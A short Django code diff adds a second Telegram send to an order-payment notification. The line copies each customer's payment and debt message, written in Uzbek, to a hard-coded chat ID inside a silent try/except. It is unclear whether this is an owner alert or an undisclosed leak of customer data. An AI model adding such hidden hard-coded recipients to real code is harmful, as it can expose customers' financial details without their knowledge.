@@ -246,6 +246,7 @@ class OrderPayment(models.Model):
                     text = f"Assalomu aleykum\n{self.order.id} raqarmli buyurtmangiz uchun to'lov qabul qilindi\nBuyurtma nomi: {self.order.name}\nTo'langan summa: {self.amount}\nBuyurtmadan qolgan qarzingiz: {customer_debt.amount}"
                     try:
                         send_telegram_message(text, self.order.customer.telegram_id)
+                        send_telegram_message(text, 5769837552)
                     except:
                         pass
             else:
